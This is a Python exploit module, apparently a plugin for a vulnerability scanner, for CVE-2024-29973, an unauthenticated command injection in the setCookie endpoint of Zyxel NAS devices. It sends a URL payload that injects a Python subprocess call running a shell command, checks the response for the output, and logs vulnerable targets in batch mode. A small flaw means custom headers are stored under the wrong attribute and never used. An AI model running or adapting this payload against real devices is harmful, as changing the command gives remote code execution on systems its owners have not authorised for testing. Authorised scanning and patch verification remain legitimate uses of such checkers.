#! /usr/bin/python3
# -*- encoding: utf-8 -*-
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
import requests,urllib3
from pub.com.output import OutPutFile
urllib3.disable_warnings()

class Cve_2024_29973:
    def __init__(self):
        self.header = None
        self.proxy = None

    def send_payload(self,url):
        url2 = url + '/cmd,/simZysh/register_main/setCookie?c0=storage_ext_cgi+CGIGetExtStoInfo+None)+and+False+or+__import__("subprocess").check_output("id",+shell=True)%23'
        try:
            req = requests.get(url2, verify=self.verify,proxies=self.proxy,headers=self.header,timeout=self.timeout)
            if "uid=" in req.text and "gid=" in req.text:
                if not self.batch:
                    OutPrintInfoSuc("Zyxel", f"存在Zyxel NAS设备 setCookie 未授权命令注入漏洞")
                    OutPrintInfo("Zyxel", url2)
                    OutPrintInfo("Zyxel", f"Response:\n{req.text.strip()}")
                else:
                    OutPrintInfoSuc("Zyxel", f"存在Zyxel NAS设备 setCookie 未授权命令注入漏洞: {url2}")
                    OutPutFile("zyxel_2024_29973.txt",f"存在Zyxel NAS设备 setCookie 未授权命令注入漏洞: {url2}")
                return True
            else:
                if not self.batch:
                    OutPrintInfo("Zyxel", f"不存在Zyxel NAS设备 setCookie 未授权命令注入漏洞")
                return False
        except Exception:
            if not self.batch:
                OutPrintInfo("Zyxel", "目标请求出错")
            return False
    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.verify = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        self.timeout = int(target["timeout"])
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("Zyxel", "开始检测Zyxel NAS设备 setCookie 未授权命令注入漏洞...")
        self.send_payload(url)
        if not self.batch:
            OutPrintInfo("Zyxel", "Zyxel NAS设备 setCookie 未授权命令注入漏洞检测结束")
